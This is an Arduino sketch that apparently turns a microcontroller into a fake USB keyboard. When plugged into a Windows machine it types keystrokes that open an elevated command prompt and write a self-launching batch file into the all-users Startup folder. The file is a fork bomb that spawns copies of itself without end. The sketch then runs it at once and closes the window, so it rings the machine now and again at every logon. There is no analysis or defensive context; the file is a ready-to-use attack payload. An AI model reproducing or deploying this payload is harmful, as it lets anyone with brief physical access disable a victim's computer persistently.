#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  delay(200);

  typeKey(229);

  delay(100);

  Keyboard.print("a");

  typeKey(KEY_RETURN);

  delay(200);

  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("cd %ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");

  typeKey(KEY_RETURN);

  Keyboard.print("copy con a.bat");

  typeKey(KEY_RETURN);

  Keyboard.print("@echo off");

  typeKey(KEY_RETURN);

  Keyboard.print(":START");

  typeKey(KEY_RETURN);

  Keyboard.print("start a.bat");

  typeKey(KEY_RETURN);

  Keyboard.print("GOTO START");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("a.bat");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}